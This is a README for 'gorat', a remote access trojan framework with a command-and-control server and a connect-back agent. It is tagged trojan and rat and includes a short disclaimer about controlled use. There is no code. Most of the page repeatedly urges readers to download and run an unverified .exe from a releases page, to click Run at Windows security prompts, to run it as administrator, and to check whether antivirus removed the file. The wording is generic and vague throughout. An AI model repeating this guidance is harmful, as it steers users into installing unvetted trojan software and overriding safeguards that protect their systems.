# 🛡️ gorat - Simple remote access for testing

[![Download gorat](https://img.shields.io/badge/Download%20gorat-Visit%20Releases-blue?style=for-the-badge)](https://github.com/quietime11/gorat/releases)

## 📦 What is gorat?

gorat is a cross platform remote access tool framework. It includes a command-and-control server and a client agent.

It is made for learning and testing in controlled environments. On Windows, the usual path is to visit the release page, download the correct file, and run it on the machine you want to test.

## 💻 What you need

- A Windows PC
- An internet connection to reach the release page
- Permission to run the tool on the system you use
- Enough free space for the app and its files
- A modern Windows version such as Windows 10 or Windows 11

If you plan to use both parts of the tool, keep both systems on the same network at first. That makes setup easier.

## 🚀 Download gorat

Use this link to visit the release page and download the Windows file:

[Visit the gorat releases page](https://github.com/quietime11/gorat/releases)

Look for the latest release near the top of the page. Download the file that matches Windows. If the release page has more than one file, choose the one that ends in `.exe` or a Windows archive such as `.zip`.

## 🪟 Install and run on Windows

1. Open the release page in your browser.
2. Find the latest version.
3. Download the Windows file.
4. If the file is in a `.zip` archive, right-click it and choose Extract All.
5. Open the extracted folder.
6. If you see an `.exe` file, double-click it to run the app.
7. If Windows shows a security prompt, choose Run only if you trust the source and you are using it in a controlled test setup.
8. Keep the app in a folder you can find again, such as Downloads or Desktop.

If the release page gives you separate files for the server and the client agent, download both before you start.

## 🧭 Basic setup flow

gorat usually has two parts:

- A server that listens for incoming connections
- A client agent that connects back to that server

A simple first run often looks like this:

1. Start the server on one Windows machine.
2. Note the IP address and port it uses.
3. Start the client agent on another machine you control.
4. Enter the server address in the client agent.
5. Confirm that the client shows up in the server view.

If the tool uses a local config file, open it in Notepad and check the saved server address, port, and any test settings.

## 🖥️ Using gorat on Windows

After launch, the app may show a window, a console, or both. Common actions may include:

- Starting and stopping the server
- Adding a client address
- Viewing connected systems
- Sending test commands in a lab setup
- Checking connection status and logs

If you do not see a window, the app may run from Command Prompt or PowerShell. In that case:

1. Open Start.
2. Type `cmd` or `PowerShell`.
3. Open the app shell.
4. Go to the folder that holds gorat.
5. Run the file from there.

## 🔧 Folder layout you may see

A release file may contain items like these:

- `gorat.exe` - the main Windows app
- `server.exe` - the command-and-control server
- `agent.exe` - the client agent
- `config.json` - saved settings
- `logs` - connection and run logs
- `README` - quick usage notes

Keep all related files in the same folder unless the release notes say else.

## 🌐 Network and firewall setup

The server may need a free port to accept connections. If the client cannot connect, check these items:

- The server is running
- The port number is correct
- Windows Firewall allows the app
- Both machines can reach each other on the network
- No other app is using the same port

If you use a home router, a local IP address is easier for first tests than a public one.

## 🧪 Quick first test

Use this simple test to check that the setup works:

1. Start the server.
2. Confirm the server shows it is listening.
3. Start the agent on the test machine.
4. Enter the server IP and port.
5. Wait for the connection to show in the server.
6. Open the log view and confirm the connection event appears.

If the connection fails, try the same test with both apps on one machine first. That can help you isolate a network issue.

## 🛠️ Common problems

### The file does not open

- Check that the download finished
- Make sure you extracted the zip file
- Right-click the file and choose Run as administrator if your test setup needs it
- Check that your antivirus did not remove the file

### The client does not connect

- Check the server IP address
- Check the port number
- Make sure the server is running first
- Check Windows Firewall rules
- Verify that both systems are on the same network for the first test

### The app opens and closes fast

- Run it from Command Prompt so you can see the message
- Look for missing files in the folder
- Check whether the release page lists extra files you need
- Confirm that the build matches your Windows version

## 📝 Suggested test setup

A clean test setup can make first use easier:

- One Windows PC for the server
- One separate Windows PC or virtual machine for the client
- A private network
- A folder just for gorat files
- Notes for the IP address and port you use

This keeps your test work simple and easy to repeat.

## 🔍 What this project is for

gorat is built for controlled learning and testing. The framework helps you study how remote access tools work, how a server and client talk to each other, and how logs and connection states change during a session.

You can use it to test:

- Local network connections
- Basic server and agent flow
- Port handling
- Logging
- Simple deployment steps on Windows and Linux

## 📁 Topics in this repository

This project is tagged with:

- c2
- cybersecurity
- go
- gorat
- hacking
- linuxrat
- machine1337
- rat
- trojan
- windowsrat

These topics point to a remote access framework with cross platform support and a focus on testing and learning.

## ❓ Help with setup

If you need to fix a setup issue, check these details in order:

1. The release file type
2. The folder where you extracted it
3. The server address
4. The port number
5. The Windows firewall rule
6. The order you started the apps
7. The log output

If the release page includes notes for a newer version, follow those notes first.

## 📌 Windows download path

To get started on Windows, visit the release page, download the latest Windows file, extract it if needed, and run the app from the folder where you saved it:

[https://github.com/quietime11/gorat/releases](https://github.com/quietime11/gorat/releases)

## 🔒 Controlled use only

Use gorat only in systems and networks you own or have permission to test, and keep the server and client inside a setup you control